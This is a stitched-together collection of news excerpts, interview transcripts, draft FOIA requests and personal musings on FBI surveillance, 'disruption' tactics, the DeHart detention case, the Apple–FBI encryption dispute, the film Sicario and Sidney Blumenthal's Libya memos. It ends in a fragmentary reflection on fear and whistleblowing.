techniques to catch potential terrorists before a crime is committed.
According to the CRS report, one technique is the “Al Capone” approach
— putting people in jail for a minor crime rather than sticking around
and waiting for evidence of a serious violent threat.
Another method is the informant, or “agent provocateur,” who starts
communicating with potential suspects, goading them into committing an
act of terrorism in order to catch them in the act.
“Where the person targeted really is a terrorist, that might make
sense,” said German. “But often when evidence that a person is a
terrorist is lacking — that’s because he isn’t a terrorist.”
German, in an email, asked: “Has the FBI secretly prevented people
from getting jobs, hazmat licenses, gun permits, security clearances,
or barred their travel where no charges were brought, providing no
opportunity for them to challenge the accusations against them or
prove their innocence? And then chalked that up as a successful
‘disruption’ so they would get a pat on the back and more resources
from Congress, regardless of whether the person was actually guilty?”
A 2009 FBI document obtained by the American Civil Liberties Union
explicitly allows field offices to engage in “disruption strategies”
at the conclusion of a terror assessment or investigation, after “all
significant intelligence has been collected, and/or the threat is
otherwise resolved.” Disruption strategy involves “a range of tools
including arrests, interviews, or source-directed operations to
effectively disrupt subject’s activities.”
“The FBI’s overbroad and aggressive use of its investigative and
surveillance powers, and its willingness to employ ‘disruption
strategies’ against subjects not charged with crimes can have serious,
adverse impacts on innocent Americans,” the ACLU concluded.
“Being placed under investigation creates an intense psychological,
and often financial, burden on the people under the microscope and
their families, even when they are never charged with a crime,” it
continued. “All the more so when a heinous crime like terrorism is
alleged, and when the investigators are convinced the subject of their
investigation is guilty but they just don’t have the evidence
necessary for arrest.”
The Congressional Research Service report noted that such methods are
reminiscent of the FBI under J. Edgar Hoover, and particularly the
COINTELPRO program, which engaged in “preventive, covert,
intelligence-based efforts to target and contain people, groups, or
movements suspected by the Bureau to be ‘rabble rousers,’ ‘agitators,’
‘key activists,’ or ‘key black extremists.’” The FBI “relied on
illegal means to curb constitutionally protected activity it deemed
threatening to national security.”
The goal of “disruption” has typically been reserved for FBI agents
pursuing people like drug traffickers — where “impeding the normal and
effective operation of the targeted organization, as indicated by
changes in the organizational leadership and/or changes in methods of
operation,” counts as disruption.
But that standard doesn’t really apply to the “lone wolves” or small
groups that make up most of the FBI’s terror suspects.
Great expectations
The FBI is under a lot of pressure these days — charged with
preventing every possible terrorist attack before it happens, while
withstanding public scrutiny of its methods.
Gomez, the former FBI agent, cuts the bureau some slack. “As a
policeman, we used to have a saying about local drug dealers — we put
them in jail for everything, use of heroin, a misdemeanor,” Gomez
said. “They’re doing life in prison 60 days at a time.”
The FBI is “going to be under severe criticism” one way or the other,
he said. “You can’t win.”
Rowley, though critical of the strategy, said she was also
sympathetic. “It’s a bad position of, oh, you better prevent every act
of terrorism,” she said.

which was rejected.
i'll be starting more targeted inquiries soon, but any additional

to be specific, it was a "no responsive records" which is a creative
denial - meaning the FOIA officer intentionally avoided responding to
the intent of the request by focusing on a search technicality
resulting in zero records. (hence my future FOIA's of a laser guided
variety... :)
"Inventory of supplies, perishable goods, utilities, and medical
instruments used or consumed at the U.S. Immigration and Customs
Enforcement detention center in Calais, Maine from 2010 through 2015,
inclusive. Medical facilities, equipment, and drugs (provided via pill
or IV injection) are of particular interest and specifically requested
among materials to search responsive to this request. Thank you!"

 the OIG report on mind-altering drugs used during interrogations is
indeed informative!
 All seemed well until the morning of August 6, 2010, when the veteran,
needing to process his student visa, crossed back into the United
States. He handed over his passport at the border patrol office at the
Calais, Maine port of entry and, according to an FBI report, was
detained by Immigrations and Customs Enforcement for “questioning in
an espionage matter.” That very day—timing too exact to be
coincidental—Detective Kniss filed a criminal complaint against DeHart
in Tennessee for the child porn investigation, nearly two whole years
after the alleged conduct. FBI agents took DeHart from the border
station to a windowless examination room. According to the veteran, he
was pushed into what looked like a dentist’s chair and administered a
forced IV that made him feel drugged—an interrogation technique
practiced at Guantanamo. About 20 minutes later, he was taken to a
conference area and interrogated by the FBI, his requests for a lawyer
denied. Using the new child porn filing as leverage—DeHart says an
agent told him the bureau knew he was not guilty in that matter—the
FBI extracted a forced confession that interpreted the embassy visits
as attempts to sell military secrets in an arrangement involving other
soldiers from the Indiana base. In DeHart’s telling, he was also
questioned about Anonymous and WikiLeaks. The agents ultimately
arrested him on the child porn charges and deposited him in a Bangor
jail, where he collapsed. An ambulance took him to Eastern Maine
Medical Center; there a medical report was made that called him
“paranoid and delusional with an idea of the FBI monitoring him and
accusing him of espionage.” The ER personnel released DeHart into the
FBI’s hands. Agents then interrogated him for two weeks without
counsel present, interviews the FBI acknowledges but the reports for
which remain classified. At one point, DeHart claims, he was hooded
and tasered. The bureau also acquired his “consent” to take over his
online aliases; the defendant would later warn through the National
Post that “They are becoming you on the Internet—specifically for the
purpose of going after Anonymous.” During one of his court appearances
in this time frame, Judge Margaret Kravchuk raised questions about the
case, calling it “odd,” but nevertheless ordered DeHart sent to
Nashville for pre-trial detention.

Mexican Cartels and Wet Willies: The Story Behind 'Sicario'
Benicio Del Toro and Emily Blunt on their War-on-Drugs thriller: "This
is not a Mexico problem, it's an 'everybody' problem"
By David Fear September 28, 2015
If you want to get Benicio Del Toro riled up, bring up the subject of
revenge. It's not like you won't get a passionate reaction out of the
sleepy-eyed actor over a variety of different topics — say,
representations of Mexico in Hollywood moviemaking, or why a
minimalistic approach to acting is often more effective, or his skill
in giving "Wet Willies" (more on that in a bit). But when the subject
of vengeance comes up in regards to his new movie, the drug-cartel
thriller Sicario (playing in select theaters now and opening
nationwide on October 2nd), Del Toro suddenly sits up very straight on
the couch in his Toronto hotel room. He stops staring at the ceiling,
locks in and becomes completely engaged, intensely so.
"What's that old saying about taking the eye-for-an-eye thing to its
logical extreme," the actor asks rhetorically. "Everybody goes blind.
There are folks who'll watch this movie and go" — he adopts a John
Wayne voice — "'This is how you do it.' That's what the film is asking
here: What side are you on? Do you follow the rules of engagement, or
do you embrace vigilantism, because you think that's the only way to
get things done?" Del Toro jerks a thumb at his costar Emily Blunt,
who's lounging on the sofa next to him, nodding. "Me, I belong to her
character's side of the equation. There has to be law and order. Or
else you're fucked, man."
That metaphorical dish best served cold is embedded into Sicario's
genetic make-up from the very first set piece, in which Blunt's F.B.I.
agent watches her kidnap-response team get taken out by a
booby-trapped house. The promise of revenge is how she's recruited to
join a special-ops task force run by a fratboy intelligence spook,
played by Josh Brolin as a human shit-eating-grin — and why she finds
herself paired with Del Toro's mystery man, who's also motivated by
the promise of payback. (The actor has said in previous interviews
that after playing everything from a cop to Pablo Escobar in drug-war
flicks, the chance to explore "the angle of revenge" was partially
what attracted him to the role.) And the concept of revenge has long
been a recurring motif in filmmaker Denis Villenueve's work, from his
breakout work Incendies (2010) to his all-star meditation on
retribution, Prisoners (2013).
In the French-Canadian director's eyes, however, vengeance was just
one of the things about actor-turned screenwriter Taylor Sheridan's
script that made him sign on immediately. "The movie addresses what's
happening in Mexico right now, sure," he says, sitting down next to
his stars. "But it could have been set in the Middle East or Africa.
Because really, this is a film about America, and how the foreign
policies of the Western world reflect a notion that we're above the
law. We act like the rest of the world belong to us." He pauses before
adding, "I’m including my home country in this group as well; you're
not off the hook, Canada. We in the West have a tendency to create
chaos. And that chaos does not improve things."
That chaos — or as Brolin's character refers to it in the movie, the
need for America's national security agencies to "shake the tree" — is
exemplified in the movie by highly questionable activities like
torturing mid-level cartel lieutenants and dispatching in-house
sicarios (an ancient Roman term that essentially translates as
"enforcer" or "hit man") to do off-the-books dirty work. Meanwhile,
drug lords are hanging mutilated bodies in the streets as warnings.
"Welcome to Juarez," Blunt's character is told; forced to navigate
these poles, she becomes, in the actress's words, "a moral person
caught in an amoral world, where having a sense of right and wrong is
considered weak instead of good."
As for her tour guide, Del Toro's Colombian tough guy with a
longstanding grudge and a license to kill, he's played as more of a
cypher — someone who's clearly in his element when literally calling
the shots during a tense firefight yet offers occasional glimpses of
being more than just another cold-blooded predator. The fact that he's
near-impossible to read was something Villeneuve and the actor
admitted was purposeful; the latter even went so far to make him
extremely lone-wolf cryptic that he kept jettisoning pages of his
dialogue. "There was this big monologue that my guy had about his past
..." Del Toro says.
"It was this whole speech he tells my character after he saves her
life, right?" Blunt interjects.
"Exactly, yeah, and it's only after he's known her for, like two
days," he continues. "So I told Denis, look:  In my experience, nobody
opens up like that about their darkness to somebody after they've just
met ... much less some guy who's a professional killer. So he let me
get rid of a huge chunk of dialogue. You know how some actors count
their lines?" Del Toro adopts a tone that can only be described as
petulant-young-movie-star. "'He got 48 lines and I got 22 lines? Who
the fuck does he think he is?' I'm the opposite of that. Give me less
things to say. Let the silences say more."
"Then he made me give all those lines to Josh," Villeneuve says.
"'Hey, Denis, I don't want this dialogue — just, like, make Brolin do
it!'" Blunt adds.
"Every morning, I'd knock on Josh's trailer door, and I'd hear, 'What
the fuck does Benicio not want to say today?'" the director chimes in.
"He still fucking blames me!" Del Toro cries.
"Clearly, there's a reason Josh isn't in this interview right now,"
Blunt jokes. "You'd just be moderating a fight."
But the director says he tends to agree with his star on the
silence-is-golden point: Filmmaking is an art form that relies more on
presence than prose, he claims. And if someone can speak volumes in a
glance or a gesture without saying a word — or if cinematographer
Roger Deakins can suggest menace and moral ambiguity by letting the
camera slowly creep-glide into a performer's personal space (what
Villeneuve calls the visual equivalent of "putting pressure on your
characters") — he'd much rather do that. Besides, he adds, Sicario may
be a thriller, but it's also a film that deals with an ongoing issue
that can't be summed up in a few climactic soliloquies. The only worry
was that the lack of speechifying might lead some to think they were
enforcing south-of-the-border stereotypes that have burrowed their way
into pop culture.
"Yeah, see, now you're talking about the tricky subject of
representation — or rather, misrepresentation," Del Toro says, leaning
in. "That was the last thing any of us wanted. We showed this movie to
an audience the other day, and someone said during the Q&A, 'Well, now
I never want to go to Mexico.'" He shakes his head. "Not every taxi
driver is Travis Bickle. Not everybody in Queens acts like they're in
Goodfellas, you know? Denis is right when he says the film is about
America, but it does take place in country that has been portrayed
recently in a very negative way. Then you've got Donald Trump saying
all this stuff about our borders …"
"You don't want to suggest that Mexico is one huge violent wasteland,"
Blunt adds, "any more than you'd want people to think Donald Trump
speaks for all Americans."
"But there's hope, right?" Del Toro asks. "It's gotten really bad in a
place like Juarez, but if you look at what happened in Bogata,
Colombia … that place has turned. It had a huge problem and it's
gotten a little bit better. I'm not a scholar on the situation, by any
means — but from what I understand, people just had enough. They came
out and demanded that somebody do something about it. The musician
Rubén Blades wrote this letter after what happened in Iguala,
Guerrero, when 43 students disappeared. Apparently, there was a
connection between the government, the police department and the drug
cartels that caused this to happen. And he said something along the
lines of: This is not a "Mexico" problem. It’s an "everybody" problem.
This isn't a political movie. But we have to make this problem stop."
Villeneuve and his stars are about to leave to introduce the film's
North American premiere at the Toronto International Film Festival
when the subject of Del Toro's impromptu interrogation techniques
comes up — specifically, whether a scene involving his character
wetting his index finger than sticking it deep into a criminal's ear —
was improvised.
"Was the 'Wet Willie' bit improvised," Del Toro says scratching his chin.
"What's a Wet Willie?" Villenueve asks.
"Oh, he just went around the set giving those to everyone," Blunt says.
"That's how Emily and I got to be such close friends," Del Toro jokes,
before he and Blunt start giving each other ice-cold stares. "I'll get
you for saying that," she adds, before the three them break and start
cracking up.

, Will FBI Take a Bite Out of Apple? Former CIA Agent on Showdown
Between Apple & U.S. Government
February 25, 2016
As the government continues to take a bite out of Apple, Apple CEO Tim
Cook says the FBI’s request to unlock the iPhone of one of the San
Bernardino shooters is the "software equivalent of cancer." In an
interview on ABC, he explained why the tech giant is resisting a court
order to help unlock the phone. The FBI says Apple is overstating the
security risk to its devices, and argues the litigation is limited.
"It won’t be unique to this one phone. It would be something that the
government can use against any phone. And even if you think that it’s
OK for the government to be able to break the encryption of anybody’s
phone … what backdoor is accessible to the U.S. government would also
be accessible to whatever is the American enemy du jour," says our
guest Barry Eisler, who has written about government surveillance in
fictional form. He is also a former CIA agent. Eisler is the author of
several books, most recently, "The God’s Eye View."
This is a rush transcript. Copy may not be in its final form.
NERMEEN SHAIKH: We turn now to the ongoing dispute over privacy and
encryption between the FBI and the computer giant Apple. In an
interview last night on ABC, Apple CEO Tim Cook explained why his
company is resisting a court order to help unlock the iPhone of one of
the San Bernardino attackers. In December, Syed Farook—Syed Rizwan
Farook and his wife killed 14 people and injured 22 others. The two
attackers were killed in a shootout with police. Cook said what the
U.S. government was asking Apple to do was the, quote, "software
equivalent of cancer."
    TIM COOK: This case is not about one phone. This case is about the
future. What is at stake here is: Can the government compel Apple to
write software that we believe would make hundreds of millions of
customers vulnerable around the world, including in the U.S.? The only
way we know would be to write a piece of software that we view as sort
of the software equivalent of cancer. We think it’s bad news to write.
We would never write it. We have never written it. And that is what is
at stake here.
AMY GOODMAN: The FBI says Apple is overstating the security risk to
its devices, and argues the litigation is limited. In an open letter
earlier this week, FBI Director James Comey wrote, quote, "The
particular legal issue is actually quite narrow. ... We don’t want to
break anyone’s encryption or set a master key loose on the land," he
said. Apple phone systems have a function that automatically erases
the access key and renders the phone permanently inaccessible after 10
failed attempts.
To talk more about the case, we’re joined by Barry Eisler, who has
written about government surveillance—in fictional form. But he’s also
a former CIA agent. Eisler is the author of a number of books, most
recently, The God’s Eye View.
It’s great to have you with us.
BARRY EISLER: Thank you, Amy. Good to be here.
AMY GOODMAN: So, let’s talk about what the government is doing and the
pushback of Apple.
BARRY EISLER: Yeah, I like Tim Cook’s metaphor. It’s nice to see
someone hitting back linguistically this way. You would expect the FBI
to say what it’s saying: It’s only about one phone. This is the kind
of thing the government always says. And I’m reminded of the time the
CIA acknowledged that it had made two torture tapes. Fifteen months
later, it acknowledged that it was in fact 92. In this case, the
government said this is only going to be about one phone, and it took
them only a day to say, "Did we say one phone? Actually, we’re talking
about 12." If you talk to any encryption or security expert anywhere,
they’ll all tell you that what the FBI is asking for is impossible.
You can’t create a backdoor for one phone without making all phones
vulnerable. So that’s one important issue here.
But there’s another one that I think is not adequately understood. As
Julian Sanchez, a guy I follow pretty closely because he knows a lot
about these things, works with the Cato Institute, put it, this just
isn’t about encryption, it’s about conscription. And I wish people
would understand this a little bit better. It’s unprecedented for the
government to be telling a private company what products it can create
and what features it has to include in those products. As Tim Cook
pointed out, where does this stop? What if the government said, "We
want to have a feature on the iPhone that enables the FBI to turn on
the iPhone camera, to turn on the iPhone microphone, anytime we want?
Would that also be OK?" So, I hope this isn’t going to happen. It’s
sort of odd have to be championing the world’s richest corporation in
its fight with the government.
AMY GOODMAN: I mean, they’re asking the Apple to write a program,
which would then create a backdoor.
BARRY EISLER: Exactly. And it won’t be unique to this one phone. It
would be something that the government could use against any phone.
And even if you think that the U.S. government—it’s OK for the
government to be able to break the encryption of anybody’s phone, even
if you trust the U.S. government and think the U.S. government has
never lied anyone, never abused its powers, even if you believe
anything like that, what backdoor is accessible to the U.S. government
would also be accessible to whatever is the American enemy du
jour—could be the Chinese government, Russia, Iran, and, of course,
not just to state actors, but also to criminal groups and hackers. A
vulnerability in a phone is not accessible to just one actor. It
becomes vulnerable to everyone.
AMY GOODMAN: But he killed 14 people, he and his wife.
BARRY EISLER: Yeah.
AMY GOODMAN: And they just want access to see if there’s other plans.
I mean, who knows what would be?
BARRY EISLER: So this is another thing the government is typically
good at. It tries to find the most attractive fact pattern it can to
use as the thin edge of a wedge that it can then use in other less
obvious fact patterns. And I see this again and again. People don’t
remember that well now, but José Padilla—I’m sure you guys
remember—the so-called dirty bomber, I mean, José Padilla was accused
of trying to create a radiological bomb and detonate it in Chicago,
and a whole lot of people were going to die. And so, to keep us safe
from that kind of thing, the government arrested him, held him on a
Navy ship, offshored him—no due process, no charges, no trial, no
access to a lawyer. It was unprecedented. But they were careful to
choose what for them was an attractive fact pattern, before doing
something so unprecedented. They picked a scary-looking guy and
accused him of doing scary things. And people didn’t protest the way
they would have if they had chosen someone a little bit different.
So it’s the same thing here. They’re not doing this in the name of, I
don’t know, preventing someone from shoplifting or something like
that. They’ve chosen a very attractive fact pattern so that they can
say the talking points that you were just parroting, which is like,
"Come on, this is just to keep us safe from the really scary people
who want to kill us all in our beds," and who indeed did kill a lot of
people in San Bernardino.
NERMEEN SHAIKH: So, to what extent do you think that accounts for
public opinion? Because a recent Pew [Research] Center poll found that
51 percent of Americans think Apple should comply with the FBI and
unlock the iPhone of one of the perpetrators of the attacks, and only
38 percent said that the FBI should not, and the rest had no opinion.
BARRY EISLER: Yeah, which is not actually—which is not a bad response
to anyone who thinks that Apple is doing this as some sort of
publicity stunt. I mean, for the moment, anyway, more people think
that Apple should comply than think that it shouldn’t. I think the
fact that so many people, actually, that 38 percent, think it’s a
really bad idea for Apple to be forced to do this is, in part, a
tribute to the educational value of the Snowden revelations and all
the journalism that’s been built on them, because I’m pretty
sure—can’t really conduct this experiment, but I’m pretty sure that if
it hadn’t been for Snowden’s revelations, the public would be focusing
entirely on the keep-us-safe-from-the-terrorists aspect of this whole
thing, and not on the but-this-is-going-to-destroy-privacy aspect.
AMY GOODMAN: I mean, interestingly, Apple has made the iCloud
available. It’s not like they haven’t done that. I mean, there have
been many requests of these different phone manufacturers to get
access to the iCloud.
BARRY EISLER: Right.
AMY GOODMAN: And, I mean, the government can’t just get access to it;
they have to get permission.
BARRY EISLER: Right.
AMY GOODMAN: So they’re making a distinction between the actual physical phone—
BARRY EISLER: Right.
AMY GOODMAN: Apparently they turned off the iCloud at some point—
BARRY EISLER: Right.
AMY GOODMAN: —so it’s what’s remained on that phone since the point
they turned it off.
BARRY EISLER: Right. So, the idea here is that some of your data is
not accessible even by the company that created the product. It’s on
your local device, and no one else should have access to it but you.
Apple has, in fact, complied with the government in the government’s
request to turn over data to which it has access. Maybe people might
like that, they might not like it. My own feeling is, look, as long as
it’s pursuant to a warrant and it’s not secret and it’s out in the
open, I can live with it. But the notion that now Apple is going to
crack encryption that its users have come to rely on to keep their
data private is—is an entirely new thing.
NERMEEN SHAIKH: Well, I want to turn to comments made by Bill Gates,
the co-founder of Microsoft. He was asked about the ongoing dispute
between Apple and the FBI, and said it was important to strike a
balance between privacy and government access. Gates was speaking to
    BILL GATES: The extreme view that the government always gets
everything, nobody supports that; having the government be blind,
people don’t support that. ... I do believe that—that with the right
safeguards, there are cases where the government, on our behalf, like
stopping terrorism, which could get worse in the future, that that is
valuable, but striking that balance. Clearly, the government’s taken
information historically and used it in ways that we didn’t expect,
going all the way back, say, to the FBI under J. Edgar Hoover. So, I’m
hoping now we can have the discussion. I do believe there are sets of
safeguards where the government shouldn’t have to be completely blind.
NERMEEN SHAIKH: That was Bill Gates speaking to Bloomberg News. Your response?
BARRY EISLER: It’s interesting. He’s so close to an epiphany. He talks
about J. Edgar Hoover. Maybe he knows about COINTELPRO. He
acknowledges that the government has abused powers that it’s been
given in the past. And so, you think he’s going in a certain direction
with this, and then he just comes up with this platitude, which is we
have to strike a balance. Like who doesn’t think that we shouldn’t
strike a balance? It’s just meaningless. There’s no one who would say,
"I don’t think we need a balance. I think it’s just one or the other."
So, I don’t know. Maybe it’s not a coincidence that Microsoft is a
fading technology company and Apple is a premier one.
AMY GOODMAN: Microsoft has said that in the past, that 80 tech
companies have cooperated—I mean, WikiLeaks has said that 80 tech
companies in the past have cooperated with the NSA, the National
Security Agency, including Microsoft.
BARRY EISLER: Yeah, so much of the—of Snowden’s revelations were about
this very thing. And the fact that the public knows about corporate
cooperation with the government now is in part, I think, what has
emboldened Apple to push back, because, again, if we didn’t know about
these things, I would expect that Apple would be quietly cooperating.
There would be no cost to their doing so. But they realize now that
there’s a significant constituency among their customers that wants
robust privacy features in Apple products, and to please those
customers, Apple realizes that in this public battle with the FBI, it
can’t just roll over and serve the FBI; otherwise, it might turn into
the next Microsoft.
Part 2: Former CIA Agent Barry Eisler Turned Writer on
Imagining/Predicting Gov't Surveillance
February 25, 2016
In our extended conversation with Barry Eisler, a former CIA agent
turned writer, he discusses his political thrillers, most recently,
"The God’s Eye View." "There have been a lot of things I’ve written
about that surprisingly turned out to be true," Eisler says. "If you
read the news ... and you use your imagination, you can read between
the lines in ways that will allow you to predict in somewhat
depressing fashion what the government is really up to."

Showdown Between Apple & U.S. Government
Watch Part 2: Former CIA Agent Says Edward Snowden Revelations
Emboldened Apple to Push Back Against FBI
This is a rush transcript. Copy may not be in its final form.
AMY GOODMAN: This is Democracy Now!, democracynow.org, The War and
Peace Report. I’m Amy Goodman, with Nermeen Shaikh, with Part 2 of our
interview with the thriller writer, The New York Times best-selling
author, Barry Eisler. His latest book is called The God’s Eye View.
Now, while it is fiction, he had his own experiences within the CIA,
in the covert wing of the Central Intelligence Agency, so there’s a
lot here. Well, you call it, Barry, reality-based.
BARRY EISLER: Yeah.
AMY GOODMAN: You have written a number of books, that have made it to
all levels of The New York Times best-seller list. And while at the
time they may have seemed speculative, so many of them have proven to
be true. Talk about A Clean Kill in Tokyo, which you published, what?
Like 13, 14 years ago?
BARRY EISLER: Yeah.
AMY GOODMAN: Where you write about remotely hacking the pacemaker and
so many other things. And go through A Lonely Resurrection and Fault
Line and "London Twist," how what, you deem them, might be a little
futuristic actually panned out.
BARRY EISLER: Yeah, there have been a lot of things I’ve written about
that, surprisingly and somewhat depressingly, have actually turned out
to be true. The one about hacking a pacemaker, I did in my first book
in 2002, turns out to be the case. I mentioned earlier Dick Cheney had
his doctor turn the wireless accessibility feature in his pacemaker
off. And there’s been a lot of—a lot of studies now about
vulnerability of not just medical devices, but of cars and even
airplanes, because everything is wired now.
Probably the closest I think I’ve ever come to something that turned
out to be true was in my third book, which I was writing in 2004.
There’s a CIA guy who’s explaining to my contract assassin, John Rain,
that the government has this thing they call a list. It’s a list of
terror targets, terrorist targets, that the government wants to take
out. And the guy, my CIA guy, Kanozaki, says, "There’s—of course
nobody calls this thing an assassination list. That would be gauche
and would be hard to explain in front of some outraged congressional
committee down the road. What we call it is a disposition list." And
then, a couple years ago, it turns out that the White House has Terror
Tuesdays, and what they call their assassination list is the
disposition matrix. I was like, "Damn! I’m even getting the—I’m almost
getting the nomenclature right." But yeah, that’s the government,
right? They’re never going to call it a kill list. In fact, we don’t
even do assassinations. We have "targeted killings." There are so many
words like that, that the government uses to obscure what’s really
going on. You know, if we wind up making another war in Libya, it’s
not going to be a war, it will just be an intervention. We never call
these things what they really are. So that was another one that I was
surprised to get right.
My second book, A Lonely Resurrection, published in 2003, I was
talking about Tokyo Electric Power Company, TEPCO, and the kind of
corruption and cover-ups they were using to conceal shoddy work on
their nuclear reactors. And then, of course, there was the 2011
tsunami and meltdown at Fukushima nuclear reactor, and it turned out
that, yeah, TEPCO was doing all this kind of stuff.
So, I tell people a lot of times that if you read the news, real news,
closely, if you watch shows like Democracy Now! and some other good
ones, and you use your imagination, you can read between the lines in
ways that will allow you to predict, in somewhat depressing fashion,
what the government is really up to.
AMY GOODMAN: Can you talk about facial recognition?
BARRY EISLER: Yeah. I’m no facial recognition expert, but there have
been some great articles about it. Kashmir Hill in Fusion wrote about
this about a year ago, and I used her article as part of my
bibliography. This technology gets better and better. I mean, it’s—if
you think about like speech recognition, 10 years ago, it was a little
bit kludgy; now it’s really, really good. Facial recognition is the
same. The biggest problem with facial recognition, as I understand it,
is false positives. So it’s hard to weed those out. But the technology
keeps getting more accurate.
And if you think about what will happen when facial recognition—as
facial recognition technology grows increasingly robust and is paired
with the government’s efforts to hack into closed-circuit television
systems and all sorts of monitors, all sorts of cameras—for example,
the ones on the laptops you guys have right here on your desk—you
really might want to put stickies over those, over those cameras,
right?—but when it gets to the point where the government has access
to cameras deployed in public spaces all over the world and pairs that
with facial recognition technology, we’re going to be living in a
world that is reminiscent of Minority Report. And if we do wind up
living in that world, as Edward Snowden was saying in a clip you
played earlier, I personally don’t think that would be a good thing,
but at the very least, we ought to be able to make an informed
decision about that and vote on it as a democracy.
NERMEEN SHAIKH: You’ve also said that no one serves up great plots for
thriller writers like the U.S. government.
BARRY EISLER: Yeah.
NERMEEN SHAIKH: So, is the government the principal source of all of
these different books that you’ve written?
BARRY EISLER: Yeah, yeah. As I say, it’s kind of depressing, again, as
an American citizen, but I’m embarrassed also to admit that as a
thriller writer, every time the government does some crazy thing, I’m
like, "Oh, my god! My next book!" I mean, when Glenn Greenwald and
Laura Poitras first started reporting on the Snowden revelations, I
was like, "This is it! This is my book!" So, thank you, Edward
Snowden. I mean, you helped me write a really great book.
I remember reading in 2002 when the CIA essentially took a public bow
for blowing up some suspected terrorists—which the government never
calls suspected terrorists, by the way; they’re always just
terrorists—blowing up a car full of suspected terrorists in Yemen,
including an American citizen. And that’s when I got the idea for this
list. I thought, "Wow! The rules have really changed post-9/11. The
government is now conducting assassinations"—sorry, targeted
killings—"of people, including American citizens. No due process
whatsoever, no judicial process. They must have some sort of list. Who
would they want to kill? How would my guy, John Rain, get involved?"
So, yeah, every time the government does a new crazy thing, it’s just
like another plot for another one of my books.
AMY GOODMAN: Well, Barry Eisler, we thank you for being with us and
for the latest book, The God’s Eye View, New York Times best-selling
author and former CIA agent in the covert division of the CIA, Barry
Eisler. This is Democracy Now! I’m Amy Goodman, with Nermeen Shaikh.

Records associated with the investigation of leaked sensitive US
intelligence products identified in email communication between
Hillary Clinton and Sid Blumenthal - email account name "sbwhoeop", on
June 8th, 2011. The previously sensitive information subject to this
request involves the clandestine planning within Sudan’s government to
seize control of oil assets in Abyei. Records within the
Counterintelligence Unit of the Operations Section within the National
Security Division's (NSD) Office of Intelligence at the Department are
specifically requested, including cross-references or related training
materials, procedures, or guidelines used during evaluation of the
incident described. Records involving joint activities with other
agencies, including the National Security Agency (NSA) or the Central
Intelligence Agency (CIA), are specifically requested, considering the
role of the Counterintelligence Unit in excluding intelligence
partners, foreign and domestic, from suspicion during course of
investigation. Origin of sensitive material is presumed to be an
exceptionally controlled program involving sensitive HUMINT and SIGINT
resources in the country of Sundan or providing communications
services to them. Obscuring information identifying the origin of
intelligence is appropriate; this request does not seek such
information. However, a search within record stores requiring special
access controls is expected. Please be considerate in recognizing that
while the operations and results of Counterintelligence Unit
activities may be exempt from disclosure, the existence of documents
may not be. Nor may procedures and policies of wider public interest
related to the context of this request be denied by Glomar without
sufficient basis. Note also the passage in time since the event
occurred, further diminished any claims of continuing sensitivity.

What Sidney Blumenthal’s Memos to Hillary Clinton Said, and How They
Were Handled
By MICHAEL S. SCHMIDTMAY 18, 2015
In 2011 and 2012, Hillary Rodham Clinton received at least 25 memos
about Libya from Sidney Blumenthal, a friend and confidant who at the
time was employed by the Clinton Foundation. The memos, written in the
style of intelligence cables, make up about a third of the almost 900
pages of emails related to Libya that Mrs. Clinton said she kept on
the personal email account she used exclusively as secretary of state.
Some of Mr. Blumenthal’s memos appeared to be based on reports
supplied by American contractors he was advising as they sought to do
business in Libya. Mr. Blumenthal also appeared to be gathering
information from anonymous Libyan and Western officials and local news
media reports. What follows are descriptions of some of the memos and
how they were handled by Mrs. Clinton and her aides.
Clinton Says Idea on Rebels Should Be Considered
In April 2011, Mr. Blumenthal sent Mrs. Clinton a memo about the rebel
forces fighting the regime of Col. Muammar el-Qaddafi. The rebels, Mr.
Blumenthal wrote, were considering hiring security contractors to
train their forces. Mrs. Clinton forwarded the memo to her aide, Jake
Sullivan, and said that the idea should be considered. (Pages 1-3)
Clinton Friend’s Libya Role Blurs Lines of Politics and Business
Sidney Blumenthal counseled Hillary Rodham Clinton when she was
secretary of state about Libya, where he was also advising a business
In 2011 and 2012, Mrs. Clinton forwarded 18 memos to Mr. Sullivan, who
in turn circulated them to senior State Department officials,
including Ambassador J. Christopher Stevens, who was killed in the
2012 attacks in Benghazi, and Ambassador Gene A. Cretz, who preceded
=An Alert to Possible Terrorist Attacks in Libya
In May 2011, Mr. Blumenthal sent Mrs. Clinton a memo reporting that
affiliates of Al Qaeda in Libya were plotting attacks in revenge for
the United States’ killing of Osama bin Laden. Mrs. Clinton forwarded
the email to Mr. Sullivan, saying that it was “disturbing, if true.”
Mr. Sullivan questioned its accuracy, but said he would share with
others. (Pages 4-5)
=Highlighting the Role of a Potential Business Partner
In January 2012, Mr. Blumenthal wrote to Mrs. Clinton about challenges
facing Libya’s new government. In the memo, Mr. Blumenthal said that
Libya’s prime minister was bringing in new economic advisers, and that
a businessman, Najib Obeida, was among “the most influential of this
group.” At the time, Mr. Obeida was a potential business partner for a
group of contractors whom Mr. Blumenthal was advising. Mrs. Clinton
instructed Mr. Sullivan to ask for a response from senior State
Department officials including Mr. Cretz, then the ambassador to
Libya. (Pages 6-15)
=A Memo Is Passed On, Despite Questions
In March 2012, Mrs. Clinton forwarded a memo by Mr. Blumenthal to Mr.
Sullivan, saying that she was dubious about its content. Mr. Sullivan
agreed, stating that Mr. Blumenthal’s report resembled “a conspiracy
theory” — but still asked State Department officials to review it.
(Pages 16-17)
=A Warning Is Forwarded to Incoming Ambassador
In April 2012, Mr. Blumenthal wrote to Mrs. Clinton warning about the
imminent rise of the Muslim Brotherhood in Libya. Mrs. Clinton
forwarded the memo to Mr. Sullivan, who sent it to Mr. Stevens, the
incoming United States ambassador to Libya. Mr. Stevens’ response —
that the Brotherhood in fact had a relatively small following in Libya
— was passed on to Mrs. Clinton. (Pages 18-24)
=Clinton Suggests Sharing Information With Israel
After receiving an August 2012 memo from Mr. Blumenthal about how the
new Libyan prime minister wanted to have a better relationship with
Israel, Mrs. Clinton suggested to Mr. Sullivan that they pass the
intelligence along to the Israelis. (Pages 25-27)

this topic has been on my mind recently,
"You know, It would be a lot easier you just didn't do X"
"This wouldn't happen if you quit annoying Y"
"If you accept, Z will pay nicely and protect you."
where X is FOIA requests, security research, PET development, etc.,
 Y is some powerful entity like FBI, NSA, Verizon, Intel, etc.,
  and Z is some convenient but forever bound by position requiring a
clearance and suspension of moral qualms.
when you've got the world to loose (nothing more encompassing than
your own family!) preservation is near irresistible.  simple fear of
harm might be compelling enough for the majority to cower compliant,
when i was young, these questions of "do i do right? or do i stay
safe?" were abstract and applicable only to foreign backwaters or past
history. a modern, free liberal democracy need never exercise such
restraint - we have Blind Justice which always finds in favor of the
over some years i lost this innocent faith in perfect justice, saw
abuses of power against the less fortunate or less familiar, accrued
